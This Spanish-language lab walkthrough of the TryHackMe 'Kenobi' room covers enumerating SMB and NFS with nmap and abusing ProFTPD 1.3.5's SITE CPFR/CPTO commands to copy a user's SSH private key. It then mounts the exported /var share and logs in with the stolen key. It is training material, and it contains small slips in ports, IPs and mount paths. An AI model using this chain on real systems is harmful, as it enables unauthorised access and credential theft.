https://tryhackme.com/room/kenobi

TODAS LAS IPS QUE SE VEN AQUÍ CAMBIAN...

## Checar los puertos abiertos y checar los samba shares

- nmap 10.10.56.240 -vvv   //para ver los puertos abiertos del servidor
- samba se usa para acceder a recursos, printers, etc en internet o intranet
- se puede usar un script de nmap para enumerar los samba shares
- nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.56.240
- se encuentran 3 ( IPC Service, hidden y printer) con acceso de read/write, read/write, none
![image](https://user-images.githubusercontent.com/44788583/149610228-bdc21841-c9af-4b5c-9aa3-729ca0b6c9f3.png)

- Se puede ver que con el share de anonymous el usuario es kenobi

----

## Enumeración de shares y descarga de archivo por smb

- smbclient //10.10.236.140/anonymous
- ls (para ver que hay ahí y encontramos el archivo log.txt)
- smbget -R smb://10.10.236.140/anonymous para bajar el contenido directo
![image](https://user-images.githubusercontent.com/44788583/149610329-98ccf2c5-20c9-49c7-b0d7-2c165d01b6c3.png)
- Si no aplicamos el comando de smbget, entonces hacemos get log.txt
![image](https://user-images.githubusercontent.com/44788583/149610357-e2f22eb5-c2ba-4a24-91bc-ed0fd4bffd89.png)

- en nuestra máquina, podemos ls para ver si está el archivo, debe descargarse en el current working directory cat log.txt para ver que trae el log file
![image](https://user-images.githubusercontent.com/44788583/148824837-9c9a2abc-9706-41e5-aa1f-d50df520dafb.png)

- Se puede ver que es un archivo de samba log y luego dice que es un archivo de configuración de pro FTPD
![image](https://user-images.githubusercontent.com/44788583/149611227-4ce8a3fd-00d5-4b00-97b7-20f880e2f1f7.png)

----

## Enumeración de RPC Bind

- RPC Bind lo que hace es que convierte las remote procedure calls (RPCs) en direcciones universales
- se enumeran con el siguiente comando de nmap: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.187.207 (el puerto 11 lo pudimos obtener del primer escaneo de nmap)
- vemos el mount var
![image](https://user-images.githubusercontent.com/44788583/149612257-c9827262-a8e8-4e2e-a9a1-76e2e4243d59.png)


## Ganando acceso inicial con ProFTPD

- Del escaneo inicial con nmap podemos ver que la versión que corre de ProFTPD es 1.3.5
- Ahora correremos un escaneo de exploits para esa versión de ProFTPD
![image](https://user-images.githubusercontent.com/44788583/149611745-3d8e585d-b2d3-4b25-8368-438ed04a7ce0.png)

- Se encuentran 3 exploits con el modulo de copy pero si se busca el 1.3.x hay otro, entonces son 4

- En los módulos de copy se dice que se usa el SITE CPFR y SITE CPTO, entonces los podemos usar desde el exploit o de manera manual porque sabemos que este servidor es vulnerable y esos comandos se pueden ejecutar

----

## Moviendo la llave privada de kenobi

- SITE CPFR /home/kenobi/.ssh/id_rsa
- SITE CPTO /var/tmp/id_rsa (Este último es porque le tienes que agregar un archivo como parametro, por es el último de id_rsa) 
- OJO, dentro de la máquina víctima, lo copiamos hacia la carpeta /var porque a esa sí tenemos acceso, está dentro de la carpeta www
![image](https://user-images.githubusercontent.com/44788583/149612421-9bfb6dec-0a7e-476d-bdd8-d14a3b133217.png)

----

## Montando volumen 

- Lo primero que se debe hacer es una carpeta donde montaremos el volumen copiado. La recomendación es crearla adentro de mnt que es donde usualmente se montan los volúmenes nuevos
- sudo mkdir /mnt/kenobi
![image](https://user-images.githubusercontent.com/44788583/149612680-fe046e3b-c937-44da-b42b-54777b4d2374.png)

- checamos que la carpeta exista con ls /mnt
- luego monntamos el volumen con mount 10.10.197.207:/var /tmp/kenobi (la ip de la máquina vulnerada y la carpeta de la misma, después como segundo parámetro en dónde la estamos montando en nuestra máquina
![image](https://user-images.githubusercontent.com/44788583/149612857-c0a24a63-bf3f-4f77-ad79-bdbb78af58e5.png)

- ls -al para checar los permisos que tenemos 
![image](https://user-images.githubusercontent.com/44788583/149612887-af767f3c-7aea-4d73-9d21-dc0b86767a3b.png)

## Usando la llave copiada para acceder al usuario kenobi 
- checamos la carpeta tmp en el folder donde se montó el volumen con ls /mnt/kenobi/tmp
![image](https://user-images.githubusercontent.com/44788583/149613004-3c21a7c3-4325-4b9c-85f8-efd917eca065.png)
- copiamos el archivo al current working directory con sudo cp /mnt/kenobi/tmp/id_rsa .   (el puntito es para que se copie donde estamos, en el current working directory)
![image](https://user-images.githubusercontent.com/44788583/149613078-708cb6a9-043f-41b5-98cf-d211d883614d.png)
- cambiamos los permisos   para que sólo nosotros podamos modificar y no nos diga warning
- sudo chmod 0400 id_rsa

----

## Ingresando como kenobi en ssh por id_rsa
- se pone la el protocolo, el archivo de llave privada, el usuario y la ip
- sudo ssh -i id_rsa kenobi@10.10.187.207
![image](https://user-images.githubusercontent.com/44788583/149613275-47f1cca1-35cd-4e91-acef-5d70395151bb.png)
tamos dentro!
- Buscamos la flag que nos dicen que busquemos en la carpeta kenobi 
![image](https://user-images.githubusercontent.com/44788583/149613327-bcbada8f-468f-4027-94d3-5e0e185798a7.png)
